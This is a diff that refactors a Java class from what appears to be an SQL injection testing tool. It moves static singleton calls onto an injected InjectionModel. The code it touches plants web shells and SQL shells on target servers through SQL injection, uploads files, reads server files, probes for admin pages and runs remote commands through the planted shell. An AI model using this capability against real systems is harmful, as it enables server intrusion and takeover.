@@ -108,10 +108,16 @@ public class RessourceAccess {
      */
     private static List<CallableFile> callablesReadFile = new ArrayList<>();
 
-    // Utility class
-    private RessourceAccess() {
-        // not used
+//    // Utility class
+//    private RessourceAccess() {
+//        // not used
+//    }
+    
+    public RessourceAccess(InjectionModel injectionModel) {
+        this.injectionModel = injectionModel;
     }
+    
+    InjectionModel injectionModel;
 
     /**
      * Check if every page in the list responds 200 Success.
@@ -119,7 +125,7 @@ public class RessourceAccess {
      * @param pageNames List of admin pages ot test
      * @throws InterruptedException
      */
-    public static void createAdminPages(String urlInjection, List<ItemList> pageNames) throws InterruptedException {
+    public void createAdminPages(String urlInjection, List<ItemList> pageNames) throws InterruptedException {
         String urlWithoutProtocol = urlInjection.replaceAll("^https?://[^/]*", "");
         String urlProtocol = urlInjection.replace(urlWithoutProtocol, "");
         String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", "");
@@ -139,7 +145,7 @@ public class RessourceAccess {
         for (String segment: directoryNames) {
             urlPart.append(segment);
             for (ItemList pageName: pageNames) {
-                taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + pageName.toString()));
+                taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + pageName.toString(), injectionModel));
             }
         }
 
@@ -157,7 +163,7 @@ public class RessourceAccess {
                     Request request = new Request();
                     request.setMessage(Interaction.CREATE_ADMIN_PAGE_TAB);
                     request.setParameters(currentCallable.getUrl());
-                    MediatorModel.model().sendToViews(request);
+                    this.injectionModel.sendToViews(request);
 
                     nbAdminPagesFound++;
                     LOGGER.debug("Found admin page: "+ currentCallable.getUrl());
@@ -185,7 +191,7 @@ public class RessourceAccess {
 
         Request request = new Request();
         request.setMessage(Interaction.END_ADMIN_SEARCH);
-        MediatorModel.model().sendToViews(request);
+        this.injectionModel.sendToViews(request);
     }
     
     /**
@@ -196,8 +202,8 @@ public class RessourceAccess {
      * @throws InjectionFailureException
      * @throws StoppedByUserSlidingException
      */
-    public static void createWebShell(String pathShell, String urlShell) throws JSqlException, InterruptedException {
-        if (!RessourceAccess.isReadingAllowed()) {
+    public void createWebShell(String pathShell, String urlShell) throws JSqlException, InterruptedException {
+        if (!this.isReadingAllowed()) {
             return;
         }
         
@@ -210,15 +216,15 @@ public class RessourceAccess {
         if (!pathShellFixed.matches(".*/$")) {
             pathShellFixed += "/";
         }
-        MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().getVendor().instance().sqlTextIntoFile(sourceShellToInject, pathShellFixed + FILENAME_WEBSHELL)
+        this.injectionModel.injectWithoutIndex(
+            this.injectionModel.getVendor().instance().sqlTextIntoFile(sourceShellToInject, pathShellFixed + FILENAME_WEBSHELL)
         );
 
         String resultInjection;
         String[] sourcePage = {""};
         try {
-            resultInjection = new SuspendableGetRows().run(
-                MediatorModel.model().getVendor().instance().sqlFileRead(pathShellFixed + FILENAME_WEBSHELL),
+            resultInjection = new SuspendableGetRows(injectionModel).run(
+                this.injectionModel.getVendor().instance().sqlFileRead(pathShellFixed + FILENAME_WEBSHELL),
                 sourcePage,
                 false,
                 1,
@@ -238,7 +244,7 @@ public class RessourceAccess {
         
         String url = urlShell;
         if ("".equals(url)) {
-            url = ConnectionUtil.getUrlBase();
+            url = injectionModel.connectionUtil.getUrlBase();
         }
 
         if (resultInjection.indexOf(sourceShellToInject) > -1) {
@@ -269,7 +275,7 @@ public class RessourceAccess {
             StringBuilder urlPart = new StringBuilder();
             for (String segment: directoryNames) {
                 urlPart.append(segment);
-                taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + FILENAME_WEBSHELL));
+                taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + FILENAME_WEBSHELL, injectionModel));
             }
 
             int submittedTasks = directoryNames.size() * 1;
@@ -310,7 +316,7 @@ public class RessourceAccess {
                 Request request = new Request();
                 request.setMessage(Interaction.CREATE_SHELL_TAB);
                 request.setParameters(pathShellFixed.replace(FILENAME_WEBSHELL, ""), urlSuccess);
-                MediatorModel.model().sendToViews(request);
+                this.injectionModel.sendToViews(request);
             } else {
                 LOGGER.warn("HTTP connection to Web payload not found");
             }
@@ -325,17 +331,17 @@ public class RessourceAccess {
      * @return
      * @throws IOException
      */
-    private static String runCommandShell(String urlCommand) throws IOException {
+    private String runCommandShell(String urlCommand) throws IOException {
         HttpURLConnection connection;
 
         String url = urlCommand;
         connection = (HttpURLConnection) new URL(url).openConnection();
-        connection.setReadTimeout(ConnectionUtil.getTimeout());
-        connection.setConnectTimeout(ConnectionUtil.getTimeout());
+        connection.setReadTimeout(injectionModel.connectionUtil.getTimeout());
+        connection.setConnectTimeout(injectionModel.connectionUtil.getTimeout());
 
         String pageSource = null;
         try {
-            pageSource = ConnectionUtil.getSource(connection);
+            pageSource = injectionModel.connectionUtil.getSource(connection);
         } catch (Exception e) {
             pageSource = "";
         }
@@ -363,7 +369,7 @@ public class RessourceAccess {
         Request request = new Request();
         request.setMessage(Interaction.MESSAGE_HEADER);
         request.setParameters(msgHeader);
-        MediatorModel.model().sendToViews(request);
+        this.injectionModel.sendToViews(request);
         
         // TODO optional
         return result;
@@ -375,7 +381,7 @@ public class RessourceAccess {
      * @param uuidShell An unique identifier for terminal
      * @param urlShell Web path of the shell
      */
-    public static void runWebShell(String command, UUID uuidShell, String urlShell) {
+    public void runWebShell(String command, UUID uuidShell, String urlShell) {
         String result = "";
         
         try {
@@ -395,7 +401,7 @@ public class RessourceAccess {
             Request request = new Request();
             request.setMessage(Interaction.GET_WEB_SHELL_RESULT);
             request.setParameters(uuidShell, result);
-            MediatorModel.model().sendToViews(request);
+            this.injectionModel.sendToViews(request);
         }
     }
 
@@ -409,8 +415,8 @@ public class RessourceAccess {
      * @throws InjectionFailureException
      * @throws StoppedByUserSlidingException
      */
-    public static void createSqlShell(String pathShell, String urlShell, String username, String password) throws JSqlException, InterruptedException {
-        if (!RessourceAccess.isReadingAllowed()) {
+    public void createSqlShell(String pathShell, String urlShell, String username, String password) throws JSqlException, InterruptedException {
+        if (!this.isReadingAllowed()) {
             return;
         }
         
@@ -423,15 +429,15 @@ public class RessourceAccess {
         if (!pathShellFixed.matches(".*/$")) {
             pathShellFixed += "/";
         }
-        MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().getVendor().instance().sqlTextIntoFile(sourceShellToInject, pathShellFixed + FILENAME_SQLSHELL)
+        this.injectionModel.injectWithoutIndex(
+            this.injectionModel.getVendor().instance().sqlTextIntoFile(sourceShellToInject, pathShellFixed + FILENAME_SQLSHELL)
         );
 
         String resultInjection;
         String[] sourcePage = {""};
         try {
-            resultInjection = new SuspendableGetRows().run(
-                MediatorModel.model().getVendor().instance().sqlFileRead(pathShellFixed + FILENAME_SQLSHELL),
+            resultInjection = new SuspendableGetRows(injectionModel).run(
+                this.injectionModel.getVendor().instance().sqlFileRead(pathShellFixed + FILENAME_SQLSHELL),
                 sourcePage,
                 false,
                 1,
@@ -451,7 +457,7 @@ public class RessourceAccess {
         
         String url = urlShell;
         if ("".equals(url)) {
-            url = ConnectionUtil.getUrlBase();
+            url = injectionModel.connectionUtil.getUrlBase();
         }
 
         if (resultInjection.indexOf(sourceShellToInject) > -1) {
@@ -482,7 +488,7 @@ public class RessourceAccess {
             StringBuilder urlPart = new StringBuilder();
             for (String segment: directoryNames) {
                 urlPart.append(segment);
-                taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + FILENAME_SQLSHELL));
+                taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + FILENAME_SQLSHELL, injectionModel));
             }
 
             int submittedTasks = directoryNames.size() * 1;
@@ -523,7 +529,7 @@ public class RessourceAccess {
                 Request request = new Request();
                 request.setMessage(Interaction.CREATE_SQL_SHELL_TAB);
                 request.setParameters(pathShellFixed.replace(FILENAME_SQLSHELL, ""), urlSuccess, username, password);
-                MediatorModel.model().sendToViews(request);
+                this.injectionModel.sendToViews(request);
             } else {
                 LOGGER.warn("HTTP connection to SQL payload not found");
             }
@@ -540,7 +546,7 @@ public class RessourceAccess {
      * @param username User name [optional]
      * @param password USEr password [optional]
      */
-    public static void runSqlShell(String command, UUID uuidShell, String urlShell, String username, String password) {
+    public void runSqlShell(String command, UUID uuidShell, String urlShell, String username, String password) {
         String result = "";
         try {
             result = runCommandShell(
@@ -617,7 +623,7 @@ public class RessourceAccess {
             Request request = new Request();
             request.setMessage(Interaction.GET_SQL_SHELL_RESULT);
             request.setParameters(uuidShell, result, command);
-            MediatorModel.model().sendToViews(request);
+            this.injectionModel.sendToViews(request);
         }
     }
 
@@ -629,8 +635,8 @@ public class RessourceAccess {
      * @throws JSqlException
      * @throws IOException
      */
-    public static void uploadFile(String pathFile, String urlFile, File file) throws JSqlException, IOException {
-        if (!RessourceAccess.isReadingAllowed()) {
+    public void uploadFile(String pathFile, String urlFile, File file) throws JSqlException, IOException {
+        if (!this.isReadingAllowed()) {
             return;
         }
         
@@ -643,15 +649,15 @@ public class RessourceAccess {
             pathShellFixed += "/";
         }
         
-        MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().getVendor().instance().sqlTextIntoFile("<"+ DataAccess.LEAD +">"+ sourceShellToInject +"<"+ DataAccess.TRAIL +">", pathShellFixed + FILENAME_UPLOAD)
+        this.injectionModel.injectWithoutIndex(
+            this.injectionModel.getVendor().instance().sqlTextIntoFile("<"+ DataAccess.LEAD +">"+ sourceShellToInject +"<"+ DataAccess.TRAIL +">", pathShellFixed + FILENAME_UPLOAD)
         );
 
         String[] sourcePage = {""};
         String sourceShellInjected;
         try {
-            sourceShellInjected = new SuspendableGetRows().run(
-                MediatorModel.model().getVendor().instance().sqlFileRead(pathShellFixed + FILENAME_UPLOAD),
+            sourceShellInjected = new SuspendableGetRows(injectionModel).run(
+                this.injectionModel.getVendor().instance().sqlFileRead(pathShellFixed + FILENAME_UPLOAD),
                 sourcePage,
                 false,
                 1,
@@ -667,7 +673,7 @@ public class RessourceAccess {
 
         String urlFileFixed = urlFile;
         if ("".equals(urlFileFixed)) {
-            urlFileFixed = ConnectionUtil.getUrlBase().substring(0, ConnectionUtil.getUrlBase().lastIndexOf('/') + 1);
+            urlFileFixed = injectionModel.connectionUtil.getUrlBase().substring(0, injectionModel.connectionUtil.getUrlBase().lastIndexOf('/') + 1);
         }
         
         if (sourceShellInjected.indexOf(sourceShellToInject) > -1) {
@@ -750,7 +756,7 @@ public class RessourceAccess {
                     Request request = new Request();
                     request.setMessage(Interaction.MESSAGE_HEADER);
                     request.setParameters(msgHeader);
-                    MediatorModel.model().sendToViews(request);
+                    this.injectionModel.sendToViews(request);
                 }
             }
         } else {
@@ -759,7 +765,7 @@ public class RessourceAccess {
         
         Request request = new Request();
         request.setMessage(Interaction.END_UPLOAD);
-        MediatorModel.model().sendToViews(request);
+        this.injectionModel.sendToViews(request);
     }
     
     /**
@@ -767,18 +773,18 @@ public class RessourceAccess {
      * @return True if user can read file, false otherwise
      * @throws JSqlException when an error occurs during injection
      */
-    public static boolean isReadingAllowed() throws JSqlException {
+    public boolean isReadingAllowed() throws JSqlException {
         // Unsupported Reading file when <file> is not present in current xmlModel
         // Fix #41055: NullPointerException on getFile()
-        if (MediatorModel.model().getVendor().instance().getXmlModel().getResource().getFile() == null) {
-            LOGGER.warn("Reading file on "+ MediatorModel.model().getVendor() +" is currently not supported");
+        if (this.injectionModel.getVendor().instance().getXmlModel().getResource().getFile() == null) {
+            LOGGER.warn("Reading file on "+ this.injectionModel.getVendor() +" is currently not supported");
             return false;
         }
         
         String[] sourcePage = {""};
 
-        String resultInjection = new SuspendableGetRows().run(
-            MediatorModel.model().getVendor().instance().sqlPrivilegeTest(),
+        String resultInjection = new SuspendableGetRows(injectionModel).run(
+            this.injectionModel.getVendor().instance().sqlPrivilegeTest(),
             sourcePage,
             false,
             1,
@@ -786,21 +792,21 @@ public class RessourceAccess {
         );
 
         if ("".equals(resultInjection)) {
-            MediatorModel.model().sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
+            this.injectionModel.sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
             Request request = new Request();
             request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
-            MediatorModel.model().sendToViews(request);
+            this.injectionModel.sendToViews(request);
             RessourceAccess.readingIsAllowed = false;
         } else if ("false".equals(resultInjection)) {
             LOGGER.warn("Privilege FILE is not granted to current user, files can't be read");
             Request request = new Request();
             request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
-            MediatorModel.model().sendToViews(request);
+            this.injectionModel.sendToViews(request);
             RessourceAccess.readingIsAllowed = false;
         } else {
             Request request = new Request();
             request.setMessage(Interaction.MARK_FILE_SYSTEM_VULNERABLE);
-            MediatorModel.model().sendToViews(request);
+            this.injectionModel.sendToViews(request);
             RessourceAccess.readingIsAllowed = true;
         }
         
@@ -817,8 +823,8 @@ public class RessourceAccess {
      * @throws InterruptedException if the current thread was interrupted while waiting
      * @throws ExecutionException if the computation threw an exception
      */
-    public static void readFile(List<ItemList> pathsFiles) throws JSqlException, InterruptedException, ExecutionException {
-        if (!RessourceAccess.isReadingAllowed()) {
+    public void readFile(List<ItemList> pathsFiles) throws JSqlException, InterruptedException, ExecutionException {
+        if (!this.isReadingAllowed()) {
             return;
         }
 
@@ -827,7 +833,7 @@ public class RessourceAccess {
         CompletionService<CallableFile> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
 
         for (ItemList pathFile: pathsFiles) {
-            CallableFile callableFile = new CallableFile(pathFile.toString());
+            CallableFile callableFile = new CallableFile(pathFile.toString(), injectionModel);
             taskCompletionService.submit(callableFile);
             RessourceAccess.callablesReadFile.add(callableFile);
         }
@@ -849,7 +855,7 @@ public class RessourceAccess {
                 Request request = new Request();
                 request.setMessage(Interaction.CREATE_FILE_TAB);
                 request.setParameters(name, content, path);
-                MediatorModel.model().sendToViews(request);
+                this.injectionModel.sendToViews(request);
 
                 if (!duplicate.contains(path.replace(name, ""))) {
                     LOGGER.info("Shell might be possible in folder "+ path.replace(name, ""));
@@ -884,7 +890,7 @@ public class RessourceAccess {
         
         Request request = new Request();
         request.setMessage(Interaction.END_FILE_SEARCH);
-        MediatorModel.model().sendToViews(request);
+        this.injectionModel.sendToViews(request);
     }
     
     /**
@@ -895,11 +901,11 @@ public class RessourceAccess {
      * At the end of the scan it plugs again the normal view.
      * @param urlList contains a list of String URL
      */
-    public static void scanList(List<ItemList> urlList) {
+    public void scanList(List<ItemList> urlList) {
         // Erase everything in the view from a previous injection
         Request requests = new Request();
         requests.setMessage(Interaction.RESET_INTERFACE);
-        MediatorModel.model().sendToViews(requests);
+        this.injectionModel.sendToViews(requests);
         
         // wait for ending of ongoing interaction between two injections
         try {
@@ -910,19 +916,19 @@ public class RessourceAccess {
         }
 
         // Display result only in console
-        MediatorModel.model().deleteObservers();
-        MediatorModel.model().addObserver(new ScanListTerminal());
+        this.injectionModel.deleteObservers();
+        this.injectionModel.addObserver(new ScanListTerminal());
         
-        MediatorModel.model().setIsScanning(true);
+        this.injectionModel.setIsScanning(true);
         RessourceAccess.isScanStopped = false;
         
         for (ItemList url: urlList) {
             ItemListScan urlurl = (ItemListScan) url;
-            if (MediatorModel.model().isStoppedByUser() || RessourceAccess.isScanStopped) {
+            if (this.injectionModel.isStoppedByUser() || RessourceAccess.isScanStopped) {
                 break;
             }
             LOGGER.info("Scanning "+ urlurl.getBeanInjection().getUrl());
-            MediatorModel.model().controlInput(
+            this.injectionModel.controlInput(
                 urlurl.getBeanInjection().getUrl(),
                 urlurl.getBeanInjection().getRequest(),
                 urlurl.getBeanInjection().getHeader(),
@@ -941,15 +947,15 @@ public class RessourceAccess {
         
         // Get back the normal view
         // TODO Don't play with View on Model
-        MediatorModel.model().addObserver(MediatorGui.frame().getObserver());
+        this.injectionModel.addObserver(MediatorGui.frame().getObserver());
         
-        MediatorModel.model().setIsScanning(false);
-        MediatorModel.model().setIsStoppedByUser(false);
+        this.injectionModel.setIsScanning(false);
+        this.injectionModel.setIsStoppedByUser(false);
         RessourceAccess.isScanStopped = false;
 
         Request request = new Request();
         request.setMessage(Interaction.END_SCAN);
-        MediatorModel.model().sendToViews(request);
+        this.injectionModel.sendToViews(request);
     }
 
     /**
